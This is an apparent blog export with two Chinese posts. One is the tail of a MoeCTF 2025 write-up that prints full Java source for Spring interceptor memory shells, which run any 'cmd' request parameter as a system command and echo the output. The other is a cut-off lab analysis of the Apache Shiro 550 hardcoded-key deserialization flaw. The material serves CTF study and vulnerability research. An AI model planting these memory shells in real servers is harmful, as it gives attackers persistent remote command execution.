writer.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/posts/3dd769b8/20260107174259514.png" alt="image.png"><br>使用方法就是先发送一次请求，在带上cmd进行命令执行</li>
<li>Interceptor内存马<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Inject_ThreadLocal.java</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.tools.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.jar.JarFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inject_ThreadLocal</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; createShellInterceptor() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;DynamicShellInterceptor&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">packageName</span> <span class="operator">=</span> <span class="string">&quot;com.dynamic.generated&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fullClassName</span> <span class="operator">=</span> packageName + <span class="string">&quot;.&quot;</span> + className;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">sourceCode</span> <span class="operator">=</span> buildShellSourceCode(packageName, className);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建临时目录</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">tempDir</span> <span class="operator">=</span> Files.createTempDirectory(<span class="string">&quot;dynamic_classes&quot;</span>);</span><br><span class="line">        <span class="type">Path</span> <span class="variable">sourceDir</span> <span class="operator">=</span> tempDir.resolve(<span class="string">&quot;src&quot;</span>);</span><br><span class="line">        <span class="type">Path</span> <span class="variable">classDir</span> <span class="operator">=</span> tempDir.resolve(<span class="string">&quot;classes&quot;</span>);</span><br><span class="line">        Files.createDirectories(sourceDir);</span><br><span class="line">        Files.createDirectories(classDir);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入源码文件</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">sourceFile</span> <span class="operator">=</span> sourceDir.resolve(className + <span class="string">&quot;.java&quot;</span>);</span><br><span class="line">        Files.write(sourceFile, sourceCode.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 编译</span></span><br><span class="line">        <span class="type">JavaCompiler</span> <span class="variable">compiler</span> <span class="operator">=</span> ToolProvider.getSystemJavaCompiler();</span><br><span class="line">        DiagnosticCollector&lt;JavaFileObject&gt; diagnostics = <span class="keyword">new</span> <span class="title class_">DiagnosticCollector</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">StandardJavaFileManager</span> <span class="variable">fileManager</span> <span class="operator">=</span> compiler.getStandardFileManager(diagnostics, <span class="literal">null</span>, <span class="literal">null</span>)) &#123;</span><br><span class="line">            Iterable&lt;? <span class="keyword">extends</span> <span class="title class_">JavaFileObject</span>&gt; compilationUnits =</span><br><span class="line">                fileManager.getJavaFileObjects(sourceFile.toFile());</span><br><span class="line"></span><br><span class="line">            <span class="type">File</span> <span class="variable">tempLibDir</span> <span class="operator">=</span> Files.createTempDirectory(<span class="string">&quot;boot-libs&quot;</span>).toFile();</span><br><span class="line">            <span class="type">String</span> <span class="variable">bootInfClasspath</span> <span class="operator">=</span> extractBootInfLibs(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/app/demo.jar&quot;</span>), tempLibDir);</span><br><span class="line"></span><br><span class="line">            List&lt;String&gt; options = Arrays.asList(</span><br><span class="line">                <span class="string">&quot;-d&quot;</span>, classDir.toString(),</span><br><span class="line">                <span class="string">&quot;-classpath&quot;</span>, bootInfClasspath</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            JavaCompiler.<span class="type">CompilationTask</span> <span class="variable">task</span> <span class="operator">=</span> compiler.getTask(</span><br><span class="line">                <span class="literal">null</span>, fileManager, diagnostics, options, <span class="literal">null</span>, compilationUnits);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!task.call()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;编译失败: &quot;</span> + diagnostics.getDiagnostics());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 加载类</span></span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;classDir.toUri().toURL()&#125;,</span><br><span class="line">                Inject_ThreadLocal.class.getClassLoader()</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> classLoader.loadClass(fullClassName);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 清理临时文件</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">extractBootInfLibs</span><span class="params">(File bootJar, File extractToDir)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        List&lt;String&gt; jarPaths = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">JarFile</span> <span class="variable">jarFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarFile</span>(bootJar)) &#123;</span><br><span class="line">            Enumeration&lt;JarEntry&gt; entries = jarFile.entries();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (entries.hasMoreElements()) &#123;</span><br><span class="line">                <span class="type">JarEntry</span> <span class="variable">entry</span> <span class="operator">=</span> entries.nextElement();</span><br><span class="line">                <span class="keyword">if</span> (entry.getName().startsWith(<span class="string">&quot;BOOT-INF/lib/&quot;</span>) &amp;&amp; entry.getName().endsWith(<span class="string">&quot;.jar&quot;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 提取JAR文件</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">jarName</span> <span class="operator">=</span> entry.getName().substring(<span class="string">&quot;BOOT-INF/lib/&quot;</span>.length());</span><br><span class="line">                    <span class="type">File</span> <span class="variable">outputJar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(extractToDir, jarName);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 确保父目录存在</span></span><br><span class="line">                    outputJar.getParentFile().mkdirs();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> jarFile.getInputStream(entry);</span><br><span class="line">                         <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(outputJar)) &#123;</span><br><span class="line">                        <span class="comment">// 使用传统的流复制方法</span></span><br><span class="line">                        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">                        <span class="type">int</span> bytesRead;</span><br><span class="line">                        <span class="keyword">while</span> ((bytesRead = is.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                            os.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    jarPaths.add(outputJar.getAbsolutePath());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> String.join(File.pathSeparator, jarPaths);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">buildShellSourceCode</span><span class="params">(String packageName, String className)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;package &quot;</span> + packageName + <span class="string">&quot;;\n\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;import javax.servlet.http.HttpServletRequest;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;import javax.servlet.http.HttpServletResponse;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;import org.springframework.web.servlet.HandlerInterceptor;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;import org.springframework.web.servlet.ModelAndView;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;import java.io.PrintWriter;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;import java.util.Scanner;\n\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;public class &quot;</span> + className + <span class="string">&quot; implements HandlerInterceptor &#123;\n\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    @Override\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        if (cmd != null &amp;&amp; !cmd.trim().isEmpty()) &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            try &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                Process process = Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                PrintWriter writer = response.getWriter();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                Scanner scanner = new Scanner(process.getInputStream()).useDelimiter(\&quot;\\\\A\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                String result = scanner.hasNext() ? scanner.next() : \&quot;\&quot;;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                scanner.close();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                writer.write(result);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                writer.flush();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                writer.close();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                return false; // 不再继续执行后续拦截器\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            &#125; catch (Exception e) &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;                e.printStackTrace();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        return true; // 继续执行后续拦截器\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    @Override\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        // 可选的后处理逻辑\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    @Override\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        // 清理资源\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取当前上下文环境</span></span><br><span class="line"><span class="comment">//        WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过 context 获取 RequestMappingHandlerMapping 对象</span></span><br><span class="line">            <span class="type">AbstractHandlerMapping</span> <span class="variable">abstractHandlerMapping</span> <span class="operator">=</span> (AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            ArrayList&lt;Object&gt; adaptedInterceptors = (ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);</span><br><span class="line">            Class&lt;?&gt; shellClass = createShellInterceptor();</span><br><span class="line">            adaptedInterceptors.add(shellClass.newInstance());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这个我在使用过程中爆400的错误，应该是体积太大的缘故，就让ai精简了一下<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MiniEcho</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1. 从当前请求上下文获取 Spring 容器</span></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes()</span><br><span class="line">                    .getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. 获取 RequestMappingHandlerMapping (Spring MVC 处理路由的核心组件)</span></span><br><span class="line">            <span class="type">AbstractHandlerMapping</span> <span class="variable">mapping</span> <span class="operator">=</span> context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 3. 反射获取拦截器列表 adaptedInterceptors</span></span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            ArrayList&lt;Object&gt; list = (ArrayList&lt;Object&gt;) field.get(mapping);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 4. 将当前类的一个实例添加到拦截器链的末尾</span></span><br><span class="line">            list.add(<span class="keyword">new</span> <span class="title class_">MiniEcho</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="comment">// 忽略异常以防报错中断</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拦截器的核心逻辑：如果请求带了 cmd 参数，则执行并拦截请求</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 执行命令</span></span><br><span class="line">                java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 直接写入 Response 并结束请求</span></span><br><span class="line">                response.getWriter().write(output);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line">                response.getWriter().close();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 返回 false 停止后续处理（实现回显）</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TemplatesImpl 必须实现的抽象方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM d, SerializationHandler[] h)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM d, DTMAxisIterator i, SerializationHandler h)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/posts/3dd769b8/20260107175931094.png" alt="image.png"><br><img src="/posts/3dd769b8/20260107175939902.png" alt="image.png"><br>参考：<a href="https://github.com/XDSEC/MoeCTF_2025/blob/main/official_writeups/Web/Writeup.md">MoeCTF_2025&#x2F;official_writeups&#x2F;Web&#x2F;Writeup.md at main · XDSEC&#x2F;MoeCTF_2025 · GitHub</a></li>
</ol>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>题目</category>
      </categories>
  </entry>
  <entry>
    <title>shiro550</title>
    <url>/posts/96409491/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>shiro550漏洞的根本原因是因为使用固定的key进行加密</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>jdk8u65</strong>（我们当时调cc链的时候已经准备好了）</p>
<p><strong>Tomcat8</strong></p>
<p><a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.81/bin/"><strong>https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.81/bin/</strong></a></p>
<p><img src="/posts/96409491/1763512639738-4c1de6e1-be7b-40fd-8106-b819214eff54.png" alt="img"></p>
<p>下载好之后解压缩，然后进入bin点击startup.bat，如果一闪而过，那就用在命令行中去运行它，看看缺什么环境变量（一般是）然后添加这个环境变量就行了。</p>
<p><img src="/posts/96409491/1763512896673-2907afd9-a8c7-43f4-a148-ba04c31cb782.png" alt="img"></p>
<p>最后运行在本地的8080端口</p>
<p><img src="/posts/96409491/1763512943902-d7bfec60-f6b9-4191-8f00-2188ad634c5e.png" alt="img"></p>
<p>shiro1.2.4</p>
<hr>
<p>漏洞影响的版本：shiro&lt;&#x3D;1.2.4</p>
<h2 id="靶场环境搭建"><a href="#靶场环境搭建" class="headerlink" title="靶场环境搭建"></a>靶场环境搭建</h2><ol>
<li>我们先下载p神的项目</li>
</ol>
<p><a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">https://github.com/phith0n/JavaThings/tree/master/shirodemo</a></p>
<ol>
<li>使用idea打开项目</li>
</ol>
<p><img src="/posts/96409491/1763513564875-910db85c-18dd-410b-831b-5d6e01a14f7b.png" alt="img"></p>
<p>在这里添加我们刚刚下载好的tomcat</p>
<ol>
<li>在进入项目结构中添加工件</li>
</ol>
<p><img src="/posts/96409491/1763513659815-6b71384c-ce32-4324-a975-affa89ba453f.png" alt="img"></p>
<ol>
<li>最后设置运行与调试</li>
</ol>
<p><img src="/posts/96409491/1763513728750-4876bb91-e102-43ba-b10a-eda46c4dd0cb.png" alt="img"></p>
<hr>
<p>点击login.jsp运行，配置好路由是这个界面</p>
<p><img src="/posts/96409491/1763513858952-cec417ee-2c2b-4d81-b5f2-71adafbdc4b6.png" alt="img"></p>
<p>至此环境搭配完成</p>
<h1 id="shiro550分析"><a href="#shiro550分析" class="headerlink" title="shiro550分析"></a>shiro550分析</h1><p>由于 Shiro 使用的 <code>RememberMe</code> 功能通过 AES 加密的 Cookie 存在默认密钥，攻击者可以利用这个漏洞构造恶意的序列化数据，执行远程代码，完全控制服务器。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这里bp抓包的问题可以使用自己的ipv4地址访问（记得改端口），如果不想使用的话就打开自己的内置浏览器来抓包。然后想要观察到set-cookie的rememberMe记得要输入对正确的账号与密码，默认是root和secret，一般出现rememberMe&#x3D;deleteMe;即含有此漏洞。</p>
<p><img src="/posts/96409491/1763516911702-0a279496-f00f-456b-8674-710e89e91954.png" alt="img"></p>
<p><img src="/posts/96409491/1763557738931-91809d87-f3b9-4d0a-b4de-e9c7dc4e5bbf.png" alt="img"></p>
<p>在接下来的请求中Cookie会带有rememberMe字段；那么就可以使用这个字段进行反序列化，从而getshell。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们现在全局中找到shiro包中的敏感的类，我们这里找到了CookieRememberMeManager这个类，然后看到了getRememberedSerializedIdentity方法</p>
<p><img src="/posts/96409491/1763534229859-2044da9d-2589-4042-a41d-6fc781685127.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!WebUtils.isHttp(subjectContext) //判断是否是http请求</span><br><span class="line">if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null  //判断cookie中是否有deleteme</span><br><span class="line">base64 = ensurePadding(base64); //判断cookie是否符合base64编码长度</span><br><span class="line">byte[] decoded = Base64.decode(base64); //对base64进行编码，最后返回</span><br></pre></td></tr></table></figure>

<p>我们向上找看谁调用了它</p>
<p><img src="/posts/96409491/1763535323174-2dc5ce95-1ce0-4b23-a3aa-ba0ec17f7c2a.png" alt="img"></p>
<p>AbstractRememberMeManager类里的getRememberPrincipals方法调用了getRememberedPrincipals方法，</p>
<p>principalCollection表示一个身份信息集合的一个类，principals的初始值是0</p>
<p>然后调用getRememberedSerializedIdentity得到cookie的字节流，最后在调用convertBytesToPrincipals方法，这个方法做的事情如下</p>
<p><img src="/posts/96409491/1763537442336-56bb0fff-a4b9-4727-ac9b-e7f6fd6adbc4.png" alt="img"></p>
<p>一个进行解密，一个进行反序列化成一个对象。</p>
<p>进入解密方法看一下喽</p>
<p><img src="/posts/96409491/1763538909615-5f1e626f-a02d-4aa9-9f4a-53c0f1d801d1.png" alt="img"></p>
<p>这里有一个对key的获取，我们应该会用到可以分析一下</p>
<p><img src="/posts/96409491/1763539015882-70bee29d-76fb-4336-885f-a81e6989f50f.png" alt="img"></p>
<p>这里返回的key是从setDecryptionCipherKey里得到的我们向上找看谁调用了setDecryptionCipherKey</p>
<p><img src="/posts/96409491/1763539095999-b79747f5-dce6-4821-a9ae-3620720b23c8.png" alt="img"></p>
<p><img src="/posts/96409491/1763539114397-1457df4b-369a-4b5b-90c2-6a1f4bfb7f33.png" alt="img"></p>
<p>在向上找一层</p>
<p><img src="/posts/96409491/1763539149760-04366d1d-8a30-45b7-823d-1045145e945b.png" alt="img"></p>
<p>这里我们看到了一个数</p>
<p><img src="/posts/96409491/1763539183756-d932087b-cf24-4e3b-8a90-4557d9aa183b.png" alt="img"></p>
<p>这个key是一个常量。这一整个分析我们可以看到这个cookie使用这个key进行的aes加密</p>
<hr>
<p>接下来我们要分析这个反序列化过程</p>
<p><img src="/posts/96409491/1763542000460-7f81bb2a-c296-4681-9496-2885686b81be.png" alt="img"></p>
<p>进入到这里，在进一步会发现是一个接口，查看实现类，我们会发现对readobject的调用，那就很舒服了。</p>
<hr>
<p>接下来我们调式分析一整个加密过程</p>
<p>把断点打到这里，然后bp发送数据包，开始调试</p>
<p><img src="/posts/96409491/1763555779725-e2416977-5238-4fd7-89ce-103342bc6ee9.png" alt="img"></p>
<p>进入rememberIdentity</p>
<p><img src="/posts/96409491/1763556065955-cfea9471-0a73-4a77-b804-421947d53123.png" alt="img"></p>
<p>保存用户名</p>
<p><img src="/posts/96409491/1763556124052-36a462d2-c61f-4425-be94-b0322997cbc0.png" alt="img"></p>
<p><img src="/posts/96409491/1763556362224-d778579f-6523-4c5d-9ae6-7c6915ea0f82.png" alt="img"></p>
<p>这里我们回到rememberIdentity方法，然后跟进rememberIdentity</p>
<p><img src="/posts/96409491/1763556537171-523e20e1-3f3b-4d9f-9082-36e974b8ccf1.png" alt="img"></p>
<p>跟进convertPrincipalsToBytes方法</p>
